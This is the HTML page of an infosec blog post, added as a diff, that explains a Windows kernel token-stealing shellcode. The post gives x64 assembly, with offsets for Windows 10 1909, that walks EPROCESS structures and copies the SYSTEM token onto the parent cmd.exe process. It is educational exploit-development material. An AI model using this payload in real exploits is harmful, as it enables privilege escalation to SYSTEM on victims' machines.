@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="description" content="">
+    <meta property="og:title" content="Windows Kernel Shellcode : TokenStealer">
+    
+    <meta property="og:type" content="article">
+    <meta property="article:published_time" content="2020-02-03">
+    
+    <meta property="og:description" content="">
+    <meta property="og:url" content="https://amriunix.com/post/windows-kernel-shellcode-tokenstealer/">
+    <meta property="og:site_name" content="InfoSec Blog">
+    
+    <meta property="og:tags" content="windows">
+    
+    <meta property="og:tags" content="exploit">
+    
+    <meta property="og:tags" content="shellcode">
+    
+    <meta property="og:tags" content="kernel">
+    
+    <meta property="og:tags" content="token">
+    
+    <meta name="generator" content="Hugo 0.50" />
+    <title>Windows Kernel Shellcode : TokenStealer</title>
+    
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/default.min.css">
+    
+    <link rel="stylesheet" href="https://amriunix.com/css/style.css">
+    
+    <link href="https://amriunix.com/index.xml" rel="alternate" type="application/rss+xml" title="InfoSec Blog" />
+    
+    
+    <link rel="icon" href="https://amriunix.com/favicon.ico" />
+    
+
+    
+    
+</head>
+<body>
+
+<nav class="navbar navbar-default navbar-fixed-top visible-xs">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+				<a class="navbar-brand" href="https://amriunix.com/">AMRIUNIX</a>
+			
+		</div>
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				
+				
+					<li><a href="https://amriunix.com/">Home</a></li>
+				
+					<li><a href="https://amriunix.com/post/">Posts</a></li>
+				
+					<li><a href="https://amriunix.com/about">About</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</nav>
+<div class="container-fluid">
+	<div class="row">
+		<div id="menu" class="hidden-xs col-sm-4 col-md-3">
+	<div id="menu-content" class="vertical-align">
+		
+			<h1 class="text-center"><a href="https://amriunix.com/">AMRIUNIX</a></h1>
+		
+		
+		
+			<small class="text-center center-block">OUSSAMA AMRI</small>
+		
+		
+		
+			<img id="profile-pic" src="https://amriunix.com//img/amriunix.png" alt="My Picture" class="img-circle center-block">
+		
+		<div id="social" class="text-center">
+			
+				<a href="https://github.com/amriunix"><i class="fa fa-github fa-2x"></i></a>
+			
+				<a href="https://twitter.com/amriunix"><i class="fa fa-twitter fa-2x"></i></a>
+			
+				<a href="https://www.linkedin.com/in/amriunix/"><i class="fa fa-linkedin fa-2x"></i></a>
+			
+
+			<a href="mailto:oussama[at]amriunix.com"><i class="fa fa-envelope-o fa-2x"></i></a>
+		</div>
+		<div id="links" class="text-center">
+			
+			
+				<a href="https://amriunix.com/">Home</a>
+			
+				<a href="https://amriunix.com/post/">Posts</a>
+			
+				<a href="https://amriunix.com/about">About</a>
+			
+		</div>
+	</div>
+</div>
+
+		<div id="content" class="col-xs-12 col-sm-8 col-md-9">
+			<div class="row">
+				<div id="post" class="col-sm-offset-1 col-sm-10 col-md-10 col-lg-10">
+
+
+<main>
+	<header>
+		<h1>Windows Kernel Shellcode : TokenStealer</h1>
+	</header>
+
+	<article>
+		<p>A typical Reverse/Bind shellcode will not work when it comes to Windows Kernel Exploitation, most of the time people often use (Nulling out ACLs, Enabling privileges or Replacing process token).</p>
+
+<p></p>
+
+<h3 id="tl-dr">TL;DR</h3>
+
+<p>In this post i&rsquo;d like to focus on the <strong>&ldquo;Replacing process token&rdquo;</strong> Shellcode. So the idea here is to find a privileged process and copy his token to an unprivileged process, normally will be our parent process (remember that an exploit (<strong>exploit.exe</strong>) are executed by a command line (<strong>cmd.exe</strong>) which is the parent process).</p>
+
+<p>to summarize the steps :</p>
+
+<ul>
+<li>Find the EPROCESS address of the current process.</li>
+<li>Find the EPROCESS address of the parent process.</li>
+<li>Find the EPROCESS address of the SYSTEM process.</li>
+<li>Copy the token of SYSTEM process to parent process.</li>
+<li>We own the NT AUTHORITY/SYSTEM.</li>
+</ul>
+
+<p>To try this please make sure that you in a context where you have arbitrary kernel mode code execution and you can run assembly code.</p>
+
+<blockquote>
+<p>Please note that you need to adopt the offsets based on the windows build number you&rsquo;re using it ! Check <a href="https://www.vergiliusproject.com/">https://www.vergiliusproject.com/</a> for more info.</p>
+</blockquote>
+
+<h4 id="step-1">Step 1</h4>
+
+<p>In our shellcode we need to start by locating the <code>_KTHREAD* CurrentThread</code> structure of the current process, let&rsquo;s see step by step how to find it !</p>
+
+<p>The <code>GS[0]</code> segment point at the <a href="https://www.vergiliusproject.com/kernels/x64/Windows%2010%20|%202016/1909%2019H2%20(November%202019%20Update)/_KPCR">_KPCR</a> (Kernel Processor Control Region) structure which contains information about the processor.</p>
+
+<p><img src="../../img/windows-kernel-shellcode-tokenstealer/KPCR.PNG" alt="_KPCR Structure" class="img-fluid img-thumbnail" width="500" height="600"/></p>
+
+<p>In the last field of <code>KPCR</code>, exactly in <code>GS[0x180]</code> segment we can find the <a href="https://www.vergiliusproject.com/kernels/x64/Windows%2010%20|%202016/1909%2019H2%20(November%202019%20Update)/_KPRCB">_KPRCB</a> (Kernel Processor Control Region Block) structure which contains information about the current Thread.</p>
+
+<p><img src="../../img/windows-kernel-shellcode-tokenstealer/KPRCB.PNG" alt="_KPRCB Structure" class="img-fluid img-thumbnail" width="500" height="600"/></p>
+
+<p>As you can see the offset <code>0x08</code> of <code>KPRCB</code> point at a <a href="https://www.vergiliusproject.com/kernels/x64/Windows%2010%20|%202016/1909%2019H2%20(November%202019%20Update)/_KTHREAD">_KTHREAD* CurrentThread</a> structure of the CurrentThread, which is at <code>GS[0x188]</code>. So first instruction in assembly will be :</p>
+
+<pre><code class="language-plaintext">mov r9, qword [gs:0x188]  ; Pointing at _KTHREAD structure
+</code></pre>
+
+<h4 id="step-2">Step 2</h4>
+
+<p><img src="../../img/windows-kernel-shellcode-tokenstealer/KTHREAD.PNG" alt="_KPRCB Structure" class="img-fluid img-thumbnail" width="500" height="600"/></p>
+
+<p>What we care more about in the <code>_KTHREAD</code> structure is the offset <code>0x220</code> where we can find the <a href="https://www.vergiliusproject.com/kernels/x64/Windows%2010%20|%202016/1909%2019H2%20(November%202019%20Update)/_KPROCESS">_KPROCESS* Process</a> structure.</p>
+
+<blockquote>
+<p>The _KPROCESS structure is first field in the <a href="https://www.vergiliusproject.com/kernels/x64/Windows%2010%20|%202016/1909%2019H2%20(November%202019%20Update)/_EPROCESS">_EPROCESS</a> structure. So the address of _KPROCESS is the same as the address of _EPROCESS.</p>
+</blockquote>
+
+<pre><code class="language-plaintext">mov r9, qword [r9 + 0x220]  ; Pointing at _KPROCESS/_EPROCESS structure
+</code></pre>
+
+<h4 id="step-3">Step 3</h4>
+
+<p><img src="../../img/windows-kernel-shellcode-tokenstealer/EPROCESS.PNG" alt="_EPROCESS Structure" class="img-fluid img-thumbnail" width="500" height="600"/></p>
+
+<p>As we can see the offset <code>0x3e8</code> from the <code>_EPROCESS</code> point at the <code>InheritedFromUniqueProcessId</code> which is the <strong>parent PID</strong> (cmd.exe in our case).</p>
+
+<pre><code class="language-plaintext">mov r8, qword [r9 + 0x3e8]  ; Saving the Parent PID in r8
+mov rax, r9                 ; Saving the _KPROCESS/_EPROCESS address
+</code></pre>
+
+<h3 id="to-summarize">To summarize</h3>
+
+<p><img src="../../img/windows-kernel-shellcode-tokenstealer/EPROCESS-MAP.png" alt="EPROCESS Memory Map" class="img-fluid img-thumbnail"/></p>
+
+<h4 id="step-4">Step 4</h4>
+
+<p>Now we have the parent PID, it&rsquo;s time to look for the <code>_EPROCESS</code> structure associated to it !</p>
+
+<p><img src="../../img/windows-kernel-shellcode-tokenstealer/PID.PNG" alt="PID" class="img-fluid img-thumbnail" width="600" height="700"/></p>
+
+<p>The offset <code>0x2f0</code> point at the <code>_LIST_ENTRY ActiveProcessLinks</code> structure, which is a linked-list points at the beginning of <code>_EPROCESS</code> structure for each <strong>Active Process</strong>.</p>
+
+<p>So we need loop over them and each time we compare the PID value with the <code>VOID* UniqueProcessId</code> (offset <code>0x2e8</code>), until we find the right <code>_EPROCESS</code> of the parent PID.</p>
+
+<pre><code class="language-plaintext">loop1:
+mov rax, qword [rax + 0x2f0]  ; Next ActiveProcessLinks Entry
+sub rax, 0x2f0                ; Point in the beginning of _EPROCESS structure
+cmp qword [rax + 0x2e8], r8   ; Compare the saved Parent PID with the UniqueProcessId
+jne loop1
+</code></pre>
+
+<h4 id="step-5">Step 5</h4>
+
+<p>Once we found the right <code>_EPROCESS</code> structure, we need to save the address that point at the <code>_EX_FAST_REF Token</code> (offset <code>0x360</code>), which is the token that need to be replaced.</p>
+
+<pre><code class="language-plaintext">mov rcx, rax    ; Copy the _EPROCESS address to RCX
+add rcx, 0x360  ; Pointing RCX at Token
+</code></pre>
+
+<h4 id="step-6">Step 6</h4>
+
+<p>We need to do the same thing with a <strong>privileged process</strong>. Most of the time we use the <code>system</code> process (PID of <code>4</code>).</p>
+
+<pre><code class="language-plaintext">loop2:
+mov rax, qword [rax + 0x2f0]  ; Next ActiveProcessLinks Entry
+sub rax, 0x2f0                ; Pointing in the beginning of _EPROCESS
+cmp qword [rax + 0x2e8], 0x4  ; Compare the PID (4) with the UniqueProcessId
+jne loop2
+</code></pre>
+
+<h4 id="step-7">Step 7</h4>
+
+<p>After we find the <code>_EPROCESS</code> structure of the privileged process, it&rsquo;s time to replace the token of the unprivileged process (Parent PID <strong>cmd.exe</strong>) with the token of the privileged process <strong>system</strong>.</p>
+
+<pre><code class="language-plaintext">mov rdx, rax            ; Pointing RDX at the beginning of _EPROCESS of system
+add rdx, 0x360          ; Pointing RDX at the Token of system
+mov rdx, qword [rdx]    ; Copying the Token
+mov qword [rcx], rdx    ; Replace the cmd.exe Token with the system Token
+ret
+</code></pre>
+
+<h3 id="exploit">Exploit</h3>
+
+<p><img src="../../img/windows-kernel-shellcode-tokenstealer/SYSTEM.PNG" alt="NT AUTHORITY/SYSTEM" class="img-fluid img-thumbnail"/></p>
+
+<h3 id="final-code">Final Code</h3>
+
+<script src="https://gist.github.com/amriunix/6c3c6ec6dd24c5eb17bc27875c6402cd.js"></script>
+
+<h4 id="sources">Sources:</h4>
+
+<ul>
+<li><a href="https://improsec.com/tech-blog/windows-kernel-shellcode-on-windows-10-part-1">Improsec</a></li>
+<li><a href="https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf">Cesar Cerrudo in 2012</a></li>
+<li><a href="https://resources.infosecinstitute.com/kernel-exploitation-part-2/">InfoSecInstitute</a>
+</br></li>
+</ul>
+	</article>
+</main>
+
+<div id="bottom-nav" class="text-center center-block">
+	<a href=" https://amriunix.com/" class="btn btn-default"><i class="fa fa-home"></i> Home</a>
+</div>
+
+
+  <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "amriunix" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+  </div>
+  
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-51953135-2', 'auto');
+    ga('send', 'pageview');
+    window.baseURL = "https:\/\/amriunix.com\/";
+  </script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.2/js/bootstrap.min.js"></script>
+  
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/highlight.min.js"></script>
+  
+  <script src="https://amriunix.com//js/App.js"></script>
+  
+</body>
+</html>
+
